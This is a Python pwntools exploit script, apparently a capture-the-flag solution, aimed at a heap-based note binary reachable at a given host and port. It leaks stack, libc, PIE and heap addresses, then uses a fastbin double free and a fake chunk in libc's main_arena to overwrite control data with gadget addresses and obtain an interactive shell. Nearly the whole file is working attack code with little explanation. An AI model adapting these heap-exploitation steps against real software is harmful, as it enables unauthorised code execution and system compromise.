#!/usr/bin/python
from pwn import *
import sys

LOCAL = True

HOST = "35.234.88.19"
PORT = 31273
PROCESS = "./chall"


def create(msg):
    r.send("CREATE %s" % msg)
    r.recvline()


def show(idx):
    r.sendline("PRINT %s" % str(idx))
    r.recvuntil(": ")
    LEAK = r.recvline()
    return LEAK


def free(idx):
    r.sendline("DELETE %s" % str(idx))
    r.recvline()


def encode(idx):
    r.sendline("ENCODE %s" % str(idx))
    r.recvline()
    LEAK = r.recvline()[:-1]

    result = ""
    for ch in LEAK:
        result += chr((ord(ch)-3) % 256)

    return result


def exploit(r):
    # create aligned string to leak stack
    create("A"*0x21)          # 0
    STACKLEAK = u64(encode(0)[0x21:0x21+8].ljust(8, "\x00"))

    log.info("STACK leak     : %s" % hex(STACKLEAK))

    free(0)

    # create aligned string to leak libc
    create("A"*0x2b)          # 0 / 1
    LIBCLEAK = u64(encode(1)[0x2a:0x2a+6].ljust(8, "\x00"))-0x41
    libc.address = LIBCLEAK - 0x3b9300

    log.info("LIBC leak      : %s" % hex(LIBCLEAK))
    log.info("LIBC           : %s" % hex(libc.address))

    free(0)

    # create aligned string to leak pie
    create("A"*(0x2b+8))      # 0 / 2
    PIELEAK = u64(encode(2)[0x33:0x33+6].ljust(8, "\x00"))

    log.info("PIE leak       : %s" % hex(PIELEAK))

    create("A"*0x50)          # 3

    # free two chunks, to fill a freed fd to leak
    free(3)
    free(0)

    HEAPLEAK = u64(encode(0)[:6].ljust(8, "\x00"))
    HEAPBASE = HEAPLEAK-0xe0
    log.info("HEAP leak      : %s" % hex(HEAPLEAK))
    log.info("__malloc_hook  : %s" % hex(libc.symbols["__malloc_hook"]))

    pause()

    # prepare double free
    create("A"*(0x50-8)+"\n")   # 4
    create("A"*(0x50-8)+"\n")   # 5

    free(4)
    free(5)
    free(4)

    # overwrite freed fd to allocate into main_arena (use misaligned address to create valid size 0x56)
    payload = p64(libc.address+0x3b4b8d)
    payload += "A"*(0x50-8-len(payload))
    payload += "\n"
    create(payload)

    create("A"*(0x50-8))
    create("A"*(0x50-8))

    # set *0x7ffff7dd0b95=0x56
    pause()

    # find good chunk to overwrite by debugging through exit code
    payload = "\x00\x00\x00"
    payload += p64(0x0)+p64(0x0)
    payload += p64(0x0)+p64(0x0)
    payload += p64(libc.address+0x5e1e50-8) + p64(0)
    payload += p64(libc.address+0x3b4bc0) + p64(libc.address+0x3b4bc0)
    payload += p64(libc.address+0x3b4bd0)[:5]

    create(payload)

    RET = libc.address + 0x00000000000b5b76

    payload = "A"*24
    payload += p64(RET)
    payload += p64(libc.address+0xc4dbf)
    payload += p64(0xdeadbeef)
    payload += p64(0xdeadbeef)

    create(payload)
    create(payload)
    create(payload)
    create(payload)

    r.sendline("EXIT")
    r.recvline()

    r.interactive()

    return


if __name__ == "__main__":
    # e = ELF("./chall")
    libc = ELF("./libc.so.6")
    context.terminal = ["tmux", "splitw", "-v"]

    if len(sys.argv) > 1:
        LOCAL = False
        r = remote(HOST, PORT)
    else:
        LOCAL = True
        # r = process("./chall", env={"LD_PRELOAD": "./libc.so.6"})
        r = process("./chall")
        # r = gdb.debug("./chall", """
        #    source ~/Tools/.gdbinit-gef
        #    continue
        # """)
        print(util.proc.pidof(r))
        pause()

    exploit(r)
